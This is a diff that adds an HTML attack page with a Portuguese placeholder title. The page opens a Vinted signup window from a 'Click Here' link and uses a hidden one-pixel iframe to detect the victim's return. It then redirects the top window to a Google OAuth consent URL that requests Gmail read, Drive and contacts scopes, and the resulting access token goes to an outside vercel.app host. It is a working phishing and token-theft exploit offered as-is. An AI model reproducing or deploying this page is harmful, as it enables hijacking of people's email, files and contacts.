@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>{Nome do Titulo}</title>
+    <style type="text/css">
+        #blackdiv {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            z-index: 100;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="blackdiv"></div>
+
+    <a href="#" onclick="launch()">Click Here</a>
+
+    <iframe src="https://www.vinted.de/favicon.ico/$%5E%&*" onload="switcher()" name="AppleAuthentication" style="opacity: 0.01;" width=1 height=1></iframe>
+
+    <script type="text/javascript">
+        let iframeLoaded = false;
+        let loginWindow;
+
+        var loadedOnce = false;
+        var launched = false;
+
+        function switcher() {
+            console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
+            if (!loadedOnce) {
+                loadedOnce = true;
+                console.log('First time loading iframe');
+            } else {
+                if (launched) {
+                    console.log('Second time + launched = true, redirecting...');
+                    top.focus();
+                    top.location = "https://accounts.google.com/o/oauth2/v2/auth?client_id=798150358870-1if758tb3p6p2l5i1e36uh7utonvduqi.apps.googleusercontent.com&redirect_uri=https://google-o-auth-pink.vercel.app&response_type=token&scope=openid%20email%20profile%20https://www.googleapis.com/auth/drive.file%20https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/contacts.readonly&include_granted_scopes=true&state=logged_test_oauth";
+                }
+            }
+        }
+
+        function launch() {
+            launched = true;
+            console.log('Opening site...');
+            loginWindow = window.open("https://www.vinted.de/member/signup/select_type?ref_url=%2F", "login");
+        }
+    </script>
+</body>
+</html>
